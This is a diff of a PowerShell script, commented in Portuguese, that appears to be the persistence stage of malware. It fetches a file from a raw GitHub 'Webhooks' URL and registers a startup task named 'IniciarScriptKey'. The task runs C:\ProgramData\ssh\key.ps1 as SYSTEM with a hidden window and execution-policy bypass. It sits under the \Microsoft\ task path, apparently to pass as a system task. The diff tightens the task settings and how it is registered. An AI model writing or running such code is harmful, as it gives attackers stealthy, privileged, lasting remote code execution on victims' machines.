@@ -5,6 +5,11 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/giaosoissomsm/Webhooks
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -ep bypass C:\ProgramData\ssh\key.ps1"
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -DisallowStartOnRemoteAppSession
 
-Register-ScheduledTask -TaskName "IniciarScriptKey" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -TaskPath "\Microsoft\"
+# Definir a tarefa para usar privilégios mais altos
+$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
+Register-ScheduledTask -TaskName "IniciarScriptKey" -InputObject $task -TaskPath "\Microsoft\"
+
+# Confirmação da criação da tarefa
+Write-Output "Tarefa agendada 'IniciarScriptKey' criada com privilégios elevados."
